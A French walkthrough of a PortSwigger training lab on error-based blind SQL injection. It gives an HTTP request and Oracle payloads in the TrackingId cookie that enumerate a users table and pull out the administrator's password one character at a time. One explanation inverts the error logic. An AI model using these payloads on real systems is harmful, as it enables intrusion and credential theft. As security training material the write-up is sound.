# Lab

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

## Exploit

Request :

```
GET / HTTP/2
Host: 0a48003403e517af82aa433c00af00c8.web-security-academy.net
Cookie: TrackingId=f4T622iCVHc7msiq; session=0s6KA2mflEQqEyUFwo7EnLKcPBJhaG9X
Sec-Ch-Ua: "Chromium";v="111", "Not(A:Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a48003403e517af82aa433c00af00c8.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
```

Paramètre `TrackingId` vulnérable à l'injection SQL.

`TrackingId=f4T622iCVHc7msiq'` cause une erreur 500.

`TrackingId=f4T622iCVHc7msiq' AND 1=1--` ne cause pas d'erreur.

### Trouver le nom de la table

On remarque qu'avec la requête

```sql
TrackingId=QyTK2tSZXS7gsjO8' || (SELECT '' FROM dual)--
```

On obtient pas d'erreur. Or avec un nom de table random, on obtient une erreur.

On peut donc déterminer si une table existe ou non avec ce payload.

Testons la base de données `users` :

```sql
TrackingId=QyTK2tSZXS7gsjO8' || (SELECT '' FROM users WHERE ROWNUM=1)--
```

Ici, on utilise `ROWNUM` pour ne récupérer qu'une seule ligne et ne pas avoir une erreur à cause de la concaténation de plusieurs lignes.

La requête ne cause pas d'erreur, donc la base de données `users` existe.

### Chercher l'utilisateur administrateur

On peut maintenant chercher l'utilisateur administrateur.

```sql
TrackingId=QyTK2tSZXS7gsjO8' || (SELECT '' FROM users WHERE username='administrator' AND ROWNUM=1)--
```

La requête ne cause pas d'erreur, donc l'utilisateur `administrator` existe.

### Trouver le mot de passe de l'utilisateur administrateur

On peut maintenant chercher le mot de passe de l'utilisateur administrateur.

#### Trouver la taille du mot de passe

Premièrement, on va chercher la taille du mot de passe.

```sql
TrackingId=QyTK2tSZXS7gsjO8' || (SELECT CASE WHEN LENGTH(password)=1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--
```

Si la requête renvoie une erreur, c'est que la taille du mot de passe n'est pas égale à 1.

On peut donc déterminer la taille du mot de passe avec une boucle sur BurpSuite Intruder et trouver que la taille du mot de passe est de 20 caractères.

#### Trouver le mot de passe

On peut maintenant chercher le mot de passe.

```sql
TrackingId=QyTK2tSZXS7gsjO8' || (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--
```

En itérant sur les caractères de `a-z` et `0-9`, on trouve que le premier caractère du mot de passe est `3`.

Pour trouver le reste du mot de passe, on incrémente le deuxième paramètre de `SUBSTR` jusqu'à ce qu'on trouve le caractère du mot de passe.

```sql
TrackingId=QyTK2tSZXS7gsjO8' || (SELECT CASE WHEN SUBSTR(password,2,1)='d' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--
```

On peut donc déterminer le mot de passe avec une boucle sur BurpSuite Intruder et trouver que le mot de passe est `3d35gt0l4m4hsc61suzq`.

